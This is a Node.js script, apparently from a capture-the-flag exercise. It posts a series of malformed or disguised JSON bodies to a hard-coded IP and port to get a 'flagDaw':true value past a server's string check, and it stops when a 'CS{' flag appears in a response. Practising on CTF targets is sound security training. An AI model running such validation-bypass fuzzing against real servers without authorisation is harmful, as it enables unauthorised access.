const http = require('http');

const url = new URL('http://49.213.52.6:6969/');

// Maybe the server checks the raw body string for "flagDaw":true
// Let's try to bypass that string check
const tests = [
  {
    name: 'flagDaw with newline before colon',
    data: '{"flagDaw"\n:true}'
  },
  {
    name: 'flagDaw with space before colon',
    data: '{"flagDaw" :true}'
  },
  {
    name: 'flagDaw with multiple spaces',
    data: '{"flagDaw"  :  true}'
  },
  {
    name: 'flagDaw with tab characters',
    data: '{"flagDaw"\t:\ttrue}'
  },
  {
    name: 'flagDaw with CRLF',
    data: '{"flagDaw"\r\n:true}'
  },
  {
    name: 'flagDaw with unicode spaces',
    data: '{"flagDaw"\u00A0:true}' // Non-breaking space
  },
  {
    name: 'flagDaw with zero-width space in value',
    data: '{"flagDaw":\u200Btrue}'
  },
  {
    name: 'flagDaw with comments (invalid JSON but might bypass string check)',
    data: '{"flagDaw":true/*comment*/}'
  },
  {
    name: 'flagDaw with trailing comma',
    data: '{"flagDaw":true,}'
  },
  {
    name: 'flagDaw with single quotes (invalid JSON)',
    data: "{'flagDaw':true}"
  },
  {
    name: 'flagDaw with backslash before quote',
    data: '{"flag\\Daw":true}'
  },
  {
    name: 'flagDaw URL encoded in JSON string',
    data: JSON.stringify({ [decodeURIComponent('flagDaw')]: true })
  },
  {
    name: 'flagDaw with BOM',
    data: '\uFEFF' + JSON.stringify({ flagDaw: true })
  },
  {
    name: 'flagDaw with different quote style',
    data: '{\'flagDaw\':true}'
  },
  {
    name: 'flagDaw reversed in JSON',
    data: JSON.stringify({ waDgalf: true }) // reversed
  },
  {
    name: 'Try sending flagDaw as base64 in JSON',
    data: JSON.stringify({ [Buffer.from('flagDaw').toString('base64')]: true })
  }
];

async function testRequest(test) {
  return new Promise((resolve) => {
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain;charset=UTF-8',
        'Content-Length': Buffer.byteLength(test.data),
        'Referer': 'http://49.213.52.6:6969/',
        'Origin': 'http://49.213.52.6:6969/',
        'Accept': '*/*'
      }
    };

    const req = http.request(options, (res) => {
      let responseData = '';
      res.on('data', (chunk) => {
        responseData += chunk;
      });
      res.on('end', () => {
        resolve({ 
          name: test.name, 
          status: res.statusCode, 
          response: responseData
        });
      });
    });

    req.on('error', (e) => {
      resolve({ name: test.name, error: e.message });
    });

    req.write(test.data);
    req.end();
  });
}

(async () => {
  console.log('Testing string-based validation bypasses...\n');
  
  for (const test of tests) {
    const result = await testRequest(test);
    console.log(`\n${test.name}:`);
    console.log(`  Status: ${result.status || 'Error'}`);
    const response = (result.response || result.error || '').substring(0, 100);
    console.log(`  Response: ${response}${(result.response || '').length > 100 ? '...' : ''}`);
    
    if (result.response && result.response.includes('CS{')) {
      console.log('\n*** FLAG FOUND ***');
      console.log('FLAG:', result.response);
      break;
    }
    
    await new Promise(r => setTimeout(r, 300));
  }
})();

